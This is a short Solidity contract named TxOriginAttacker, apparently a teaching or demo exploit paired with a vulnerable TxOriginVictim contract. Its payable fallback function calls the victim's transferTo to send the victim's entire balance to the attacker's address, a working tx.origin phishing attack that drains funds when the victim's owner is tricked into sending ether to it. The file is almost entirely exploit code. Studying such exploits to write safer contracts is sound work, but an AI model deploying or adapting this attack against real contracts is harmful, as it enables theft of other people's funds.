pragma solidity ^0.4.23;

import "./TxOriginVictim.sol";

contract TxOriginAttacker {

    address owner;
    TxOriginVictim victim;

    function TxOriginAttacker(address _victim, address _owner) public {
        owner = _owner;
        victim = TxOriginVictim(_victim);
    }

    function() public payable {
        victim.transferTo(owner, address(victim).balance);
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}
